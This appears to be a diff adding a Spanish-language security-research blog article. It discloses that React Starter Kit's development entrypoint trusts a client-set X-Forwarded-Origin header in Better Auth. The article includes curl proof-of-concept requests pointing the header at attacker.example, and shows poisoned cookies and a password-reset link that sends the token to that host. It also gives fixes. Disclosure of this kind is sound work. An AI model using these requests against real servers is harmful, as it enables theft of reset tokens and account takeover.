@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>React Starter Kit: X-Forwarded-Origin en Better Auth | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre el control de Better Auth mediante X-Forwarded-Origin en el entrypoint de desarrollo de React Starter Kit." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/react-starter-kit-forwarded-origin-auth-poisoning.html" />
+  <meta property="og:title" content="React Starter Kit: X-Forwarded-Origin en Better Auth" />
+  <meta property="og:description" content="Investigación sobre el envenenamiento de origen confiado por Better Auth en el entrypoint de desarrollo." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/react-starter-kit-forwarded-origin-auth-poisoning.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="React Starter Kit: X-Forwarded-Origin en Better Auth" />
+  <meta name="twitter:description" content="X-Forwarded-Origin controlaba valores sensibles de Better Auth en el entrypoint de desarrollo." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / react starter kit</p>
+      <h1>Forwarded-origin auth poisoning<span>_</span></h1>
+      <div class="writeup-meta"><span>Medium</span><span>Header poisoning</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">React Starter Kit</span><span class="tag">Better Auth</span><span class="tag">Header Poisoning</span><span class="tag">Dev Environment</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> el problema afecta únicamente al entrypoint del servidor de desarrollo <code>apps/api/dev.ts</code>. La ruta de despliegue de producción en Cloudflare Workers (<code>apps/api/worker.ts</code>) obtiene <code>APP_ORIGIN</code> de bindings estáticos y no está afectada por este comportamiento.</p></blockquote>
+
+        <p>Durante la revisión de React Starter Kit encontré que el header de solicitud <code>X-Forwarded-Origin</code>, controlado por el cliente, podía modificar la configuración de Better Auth en el servidor local de desarrollo.</p>
+
+        <p>El header se utilizaba para construir <code>APP_ORIGIN</code> sin allowlist ni validación, y <code>createAuth()</code> se reconstruía en cada petición con ese valor. Esto permitía envenenar la <code>baseURL</code>, <code>trustedOrigins</code>, el origen de passkeys y los prefijos de seguridad de las cookies.</p>
+
+        <p>La consecuencia más relevante confirmada fue el envenenamiento de enlaces de recuperación de contraseña: el token se incluía en una URL construida con la <code>baseURL</code> controlada por el header. En el entorno local, una petición podía hacer que el enlace enviado apuntara a infraestructura del atacante.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Proyecto</td><td>React Starter Kit</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/kriasoft/react-starter-kit" target="_blank" rel="noopener noreferrer">github.com/kriasoft/react-starter-kit</a></td></tr>
+            <tr><td>Reporte enviado</td><td>7 de agosto de 2026</td></tr>
+            <tr><td>Versión</td><td>main</td></tr>
+            <tr><td>Commit</td><td><code>dff3e037a06c9ad8889e5b7a14e3a4f61617f3ab</code></td></tr>
+            <tr><td>Componente</td><td><code>apps/api/dev.ts</code></td></tr>
+            <tr><td>Dependencia</td><td>Better Auth <code>1.4.18</code></td></tr>
+            <tr><td>Header</td><td><code>X-Forwarded-Origin</code></td></tr>
+            <tr><td>Autenticación</td><td>No requerida para enviar el header</td></tr>
+            <tr><td>Impacto principal</td><td>Password-reset link poisoning y cookie security downgrade</td></tr>
+            <tr><td>Severidad</td><td>Medium</td></tr>
+            <tr><td>Alcance</td><td>Local dev entrypoint only</td></tr>
+            <tr><td>Estado</td><td>Reported / local research</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Origen controlado por el cliente</h2>
+        <p>En <code>apps/api/dev.ts</code>, el origen de la aplicación se resolvía dando prioridad al header enviado por la solicitud:</p>
+        <pre><code>APP_ORIGIN:
+  c.req.header("x-forwarded-origin") ||
+  process.env.APP_ORIGIN ||
+  c.env.APP_ORIGIN ||
+  "http://localhost:5173",</code></pre>
+
+        <p>El valor no se validaba contra una allowlist ni contra el <code>envSchema</code> de <code>apps/api/lib/env.ts</code>, que solo valida <code>Bun.env</code> una vez durante la carga del módulo.</p>
+
+        <p>El proxy de Vite establece este header a partir del Origin/Host real del navegador en <code>vite.config.ts</code>. Sin embargo, el servidor de desarrollo confiaba en el header incluso cuando la petición llegaba directamente y no a través del proxy.</p>
+
+        <h2>Superficie afectada en Better Auth</h2>
+        <p>Better Auth utilizaba el valor en varios puntos de la configuración:</p>
+        <ul>
+          <li><code>baseURL</code>, para construir URLs absolutas.</li>
+          <li><code>trustedOrigins</code>, para validar orígenes confiables.</li>
+          <li><code>rpID</code> y <code>origin</code> de passkeys.</li>
+          <li>El flag <code>Secure</code> y los prefijos de las cookies de autenticación.</li>
+        </ul>
+
+        <p>El efecto podía resumirse así:</p>
+        <pre><code>X-Forwarded-Origin: https://attacker.example
+        ↓
+APP_ORIGIN = https://attacker.example
+        ↓
+createAuth() por petición
+        ↓
+baseURL / trustedOrigins / cookies alterados</code></pre>
+
+        <h2>Envenenamiento de cookies</h2>
+        <p>En el entorno local, un sign-in normal no incluía prefijos seguros:</p>
+        <pre><code>set-cookie: better-auth.session_token=&lt;redacted&gt;; Max-Age=604800; Path=/; HttpOnly; SameSite=Lax
+set-cookie: auth=1; Path=/; HttpOnly; SameSite=Lax</code></pre>
+
+        <p>La misma petición, añadiendo un único header controlado por el cliente, devolvía cookies con prefijo seguro y flag <code>Secure</code>:</p>
+        <pre><code>set-cookie: __Secure-better-auth.session_token=&lt;redacted&gt;; Max-Age=604800; Path=/; HttpOnly; Secure; SameSite=Lax
+set-cookie: __Host-auth=1; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre>
+
+        <p>Esto confirma que una cabecera no autenticada podía cambiar la forma en que Better Auth emitía las cookies de una sesión real. La consecuencia práctica depende del esquema HTTP/HTTPS y del proxy usado en el entorno de desarrollo.</p>
+
+        <h2>Password-reset link poisoning</h2>
+        <p>Better Auth <code>1.4.18</code> construía el enlace de recuperación utilizando <code>ctx.context.baseURL</code>:</p>
+        <pre><code>const url = `${ctx.context.baseURL}/reset-password/${verificationToken}?callbackURL=${callbackURL}`;</code></pre>
+
+        <p>El token se incluía directamente en el path. Si <code>baseURL</code> había sido envenenada, el enlace podía tomar esta forma:</p>
+        <pre><code>https://attacker.example/api/auth/reset-password/&lt;verification-token&gt;?...</code></pre>
+
+        <p>Una solicitud posterior al enlace enviaría el token a la infraestructura controlada por el atacante. El token podría reproducirse contra la API real, sujeto a su expiración y a las condiciones del flujo de recuperación.</p>
+
+        <h2>Por qué el Origin no mitigaba el problema</h2>
+        <p>La ruta de solicitud de recuperación estaba cubierta por el middleware global de Better Auth, pero la validación del Origin únicamente inspeccionaba el header <code>Origin</code> cuando la solicitud incluía una cookie o cuando se activaba <code>forceValidate</code>.</p>
+
+        <p>Una petición anónima de recuperación sin cookie no activaba esa condición. Por tanto, el atacante podía enviar el header <code>X-Forwarded-Origin</code> directamente al servidor de desarrollo sin necesitar un Origin válido ni una sesión previa.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La reproducción utilizó PostgreSQL 16, el comando <code>bun db:push</code> y <code>bun api:dev</code>. El servidor Bun escuchaba por defecto en <code>0.0.0.0</code> con el puerto <code>8787</code>, por lo que era accesible desde la misma red si el equipo exponía el entrypoint sin un proxy restrictivo.</p>
+
+        <h3>1. Crear un usuario de prueba</h3>
+        <pre><code>curl -X POST http://localhost:8787/api/auth/sign-up/email \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email":"victima@test.local",
+    "password":"Test1234!",
+    "name":"Victima"
+  }'</code></pre>
+
+        <h3>2. Sign-in sin header</h3>
+        <pre><code>curl -is -X POST http://localhost:8787/api/auth/sign-in/email \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email":"victima@test.local",
+    "password":"Test1234!"
+  }'</code></pre>
+        <pre><code>set-cookie: better-auth.session_token=&lt;redacted&gt;; Max-Age=604800; Path=/; HttpOnly; SameSite=Lax
+set-cookie: auth=1; Path=/; HttpOnly; SameSite=Lax</code></pre>
+
+        <h3>3. Sign-in con origen envenenado</h3>
+        <pre><code>curl -is -X POST http://localhost:8787/api/auth/sign-in/email \
+  -H "Content-Type: application/json" \
+  -H "X-Forwarded-Origin: https://attacker.example" \
+  -d '{
+    "email":"victima@test.local",
+    "password":"Test1234!"
+  }'</code></pre>
+        <pre><code>set-cookie: __Secure-better-auth.session_token=&lt;redacted&gt;; Max-Age=604800; Path=/; HttpOnly; Secure; SameSite=Lax
+set-cookie: __Host-auth=1; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre>
+
+        <p>Una única cabecera no autenticada cambió los prefijos y el atributo <code>Secure</code> de las cookies de una sesión válida.</p>
+
+        <h3>4. Solicitud de recuperación</h3>
+        <p>Con el mismo origen envenenado, la lógica de recuperación podía construir el enlace utilizando <code>https://attacker.example</code> como base:</p>
+        <pre><code>POST /api/auth/request-password-reset
+X-Forwarded-Origin: https://attacker.example
+
+reset link:
+https://attacker.example/api/auth/reset-password/&lt;verification-token&gt;?callbackURL=...</code></pre>
+
+        <p>El token aparecía en la URL generada para el correo. En un laboratorio con un listener HTTPS controlado, la visita al enlace permitió observar la llegada del token al origen configurado por el atacante.</p>
+
+        <h2>Alcance y limitaciones</h2>
+        <ul>
+          <li>El problema está limitado a <code>apps/api/dev.ts</code>, el entrypoint de desarrollo local.</li>
+          <li><code>apps/api/worker.ts</code> utiliza bindings estáticos para <code>APP_ORIGIN</code> y no reproduce este flujo.</li>
+          <li>La explotación requiere que el servidor de desarrollo esté accesible desde la red del atacante.</li>
+          <li>El mecanismo de toma de cuenta se limita a datos de desarrollo o prueba, no a producción.</li>
+          <li>La prueba de concepto utiliza una cuenta local sintética y no datos de terceros.</li>
+        </ul>
+
+        <h2>Corrección sugerida</h2>
+        <ul>
+          <li>No dar prioridad a <code>X-Forwarded-Origin</code> enviado por el cliente sobre <code>APP_ORIGIN</code> configurado.</li>
+          <li>Validar cualquier origen reenviado contra <code>ALLOWED_ORIGINS</code> antes de usarlo en Better Auth.</li>
+          <li>Requerir explícitamente <code>APP_ORIGIN</code> también en desarrollo.</li>
+          <li>Confiar en forwarded headers únicamente cuando la petición provenga de un proxy conocido.</li>
+          <li>Utilizar una <code>baseURL</code> estática para la creación de Better Auth cuando sea posible.</li>
+          <li>Añadir pruebas que envíen headers de origen arbitrarios a los flujos de sign-in y password reset.</li>
+        </ul>
+
+        <p>Better Auth dispone de la opción <code>advanced.trustedProxyHeaders</code> para leer headers de proxy específicos cuando no existe una <code>baseURL</code> estática. Ese modelo, junto con prioridad para la configuración de entorno, evita que un valor reenviado arbitrario sustituya al origen configurado.</p>
+
+        <h2>Estado</h2>
+        <p>El hallazgo fue reproducido mediante revisión de código y validación dinámica contra el commit <code>dff3e037a06c9ad8889e5b7a14e3a4f61617f3ab</code>. El artículo documenta únicamente el entrypoint de desarrollo y el alcance confirmado.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
